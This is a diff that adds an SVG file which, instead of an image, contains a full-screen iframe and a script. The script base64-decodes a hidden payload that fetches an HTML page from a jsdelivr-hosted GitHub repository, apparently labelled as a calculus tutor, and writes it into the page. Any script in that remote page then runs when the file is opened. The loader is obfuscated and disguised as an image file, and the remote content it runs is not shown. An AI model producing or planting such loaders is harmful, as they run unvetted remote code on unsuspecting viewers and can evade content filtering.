@@ -1,0 +1,11 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position:fixed;top:0;left:0;">
+<foreignObject x="0" y="0" width="100%" height="100%">
+<body xmlns="http://www.w3.org/1999/xhtml">
+<iframe id="test" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;margin:0;padding:0;overflow:hidden;"></iframe>
+<script>
+let encoded = "DQo8c2NyaXB0Pg0KICAgIGNvbnN0IHRhcmdldFVybCA9ICdodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvTm9haHNBbWF6aW5nVHV0b3JpbmdIZWxwL05vYWhzLUNhbGN1bHVzLVR1dG9yQHJlZnMvaGVhZHMvbWFzdGVyL2luZGV4Lmh0bWwnOw0KICAgIGNvbnN0IGJhc2VVcmwgICA9ICdodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvTm9haHNBbWF6aW5nVHV0b3JpbmdIZWxwL05vYWhzLUNhbGN1bHVzLVR1dG9yQG1hc3Rlci8nOw0KDQogICAgZmV0Y2godGFyZ2V0VXJsKQ0KICAgICAgICAudGhlbihyZXNwb25zZSA9PiB7DQogICAgICAgICAgICBpZiAoIXJlc3BvbnNlLm9rKSB0aHJvdyBuZXcgRXJyb3IoJ05ldHdvcmsgcmVzcG9uc2Ugd2FzIG5vdCBvaycpOw0KICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnRleHQoKTsNCiAgICAgICAgfSkNCiAgICAgICAgLnRoZW4oaHRtbCA9PiB7DQogICAgICAgICAgICBpZiAoIWh0bWwuaW5jbHVkZXMoJzxiYXNlJykpIHsNCiAgICAgICAgICAgICAgICBodG1sID0gaHRtbC5yZXBsYWNlKCc8aGVhZD4nLCBgPGhlYWQ+PGJhc2UgaHJlZj0iJHtiYXNlVXJsfSI+YCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBkb2N1bWVudC5vcGVuKCk7DQogICAgICAgICAgICBkb2N1bWVudC53cml0ZShodG1sKTsNCiAgICAgICAgICAgIGRvY3VtZW50LmNsb3NlKCk7DQogICAgICAgIH0pDQogICAgICAgIC5jYXRjaChlcnJvciA9PiB7DQogICAgICAgICAgICBkb2N1bWVudC5ib2R5LmlubmVySFRNTCA9IGA8aDMgc3R5bGU9ImNvbG9yOiNmODcxNzEiPkZhaWxlZCB0byBsb2FkIGNvbnRlbnQuPC9oMz48cD4ke2Vycm9yLm1lc3NhZ2V9PC9wPmA7DQogICAgICAgIH0pOw0KPC9zY3JpcHQ+";
+document.getElementById("test").srcdoc = atob(encoded);
+</script>
+</body>
+</foreignObject>
+</svg>
